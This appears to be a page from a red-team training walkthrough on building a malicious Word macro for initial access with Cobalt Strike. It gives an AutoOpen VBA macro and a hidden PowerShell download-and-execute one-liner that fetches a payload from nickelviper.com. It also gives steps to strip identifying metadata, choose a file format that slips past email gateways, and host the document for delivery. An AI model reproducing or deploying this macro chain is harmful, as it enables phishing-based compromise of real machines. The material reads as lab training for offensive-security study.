# Visual Basic for Applications (VBA) Macros

1. Launch Word on the Attacker Desktop.
2. Create a macro and copy the below into Word.&#x20;

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "notepad"

End Sub
```

3. In Cobalt Strike, go to `Attacks` _>_ `Scripted Web Delivery (S)` and generate a 64-bit PowerShell payload for your HTTP listener.  The URI path can be anything, but I will keep it as `/a`.

<figure><img src="../../../../.gitbook/assets/swd.webp" alt=""><figcaption></figcaption></figure>

4. This will generate a PowerShell payload and host it on the team server so that it can be downloaded over HTTP and executed in-memory.  After clicking `Launch`, Cobalt Strike will generate the PowerShell one-liner that will do just that.

<figure><img src="../../../../.gitbook/assets/oneliner.webp" alt=""><figcaption></figcaption></figure>

5. Copy/paste this line into the VBA and make sure to add another set of double quotation marks around the IEX command. It should look like this:

{% code overflow="wrap" %}
```powershell
Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://nickelviper.com/a'))"""
```
{% endcode %}

6. To prepare the document for delivery, go to `File` _>_ `Info` _>_ `Inspect Document` _>_ `Inspect Document`, which will bring up the Document Inspector. Click `Inspect` and then `Remove All` next to `Document Properties and Personal Information`.  This is to prevent the username on your system being embedded in the document.
7. Next, go to `File` _>_ `Save As` and save it to `C:\Payloads`.  Give it any filename, but in the `Save as` `type` dropdown, change the format from `.docx` to `Word 97-2003 (.doc)`.  We do this because you can't save macros inside a `.docx` and there's a stigma around the macro-enabled `.docm` extension (e.g. the thumbnail icon has a huge `!` and some web/email gateway block them entirely).  I find that this legacy `.doc` extension is the best compromise.
8. We then want to upload this file to the team server as well.  Go to `Site Management` _>_ `Host File` and select your document.

<figure><img src="../../../../.gitbook/assets/host-file.webp" alt=""><figcaption></figcaption></figure>
